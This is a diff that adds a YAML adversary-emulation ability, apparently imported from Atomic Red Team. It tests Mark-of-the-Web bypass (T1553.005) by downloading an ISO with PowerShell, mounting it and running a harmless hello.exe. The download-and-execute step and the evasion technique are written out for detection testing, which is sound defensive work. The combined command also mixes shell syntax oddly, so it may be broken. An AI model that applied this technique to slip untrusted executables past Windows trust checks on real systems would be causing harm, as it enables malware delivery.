@@ -1,0 +1,59 @@
+- id: 42f22b00-0242-4afc-a61b-0da05041f9cc
+  name: Mount an ISO image and run executable from the ISO
+  description: "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web\
+    \ and run hello.exe executable from the ISO. \nUpon successful execution, powershell\
+    \ will download the .iso from the Atomic Red Team repo, mount the image, and run\
+    \ the executable from the ISO image that will open command prompt echoing \"Hello,\
+    \ World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620\
+    \ Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,"
+  tactic: defense-evasion
+  technique:
+    attack_id: T1553.005
+    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso
+          -OutFile "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso"; fi; Mount-DiskImage
+          -ImagePath "PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso" -StorageType
+          ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "TestIso"; $driveLetter
+          = ($keep | Get-Volume).DriveLetter; invoke-item "$($driveLetter):\hello.exe"'
+        cleanup: Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null; Stop-process
+          -name "hello" -Force -ErrorAction ignore
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1553.005
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      path_of_iso:
+        description: Path to ISO file
+        type: path
+        default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso
+    dependencies:
+    - description: 'FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})
+
+        '
+      prereq_command: 'if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{path_of_iso}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso
+        -OutFile "#{path_of_iso}"
+
+        '
+    technique_created: '2021-02-22T14:20:31.650Z'
+    atomic_guid: 42f22b00-0242-4afc-a61b-0da05041f9cc
+    import_timestamp: '2025-06-24T11:15:00.827076Z'
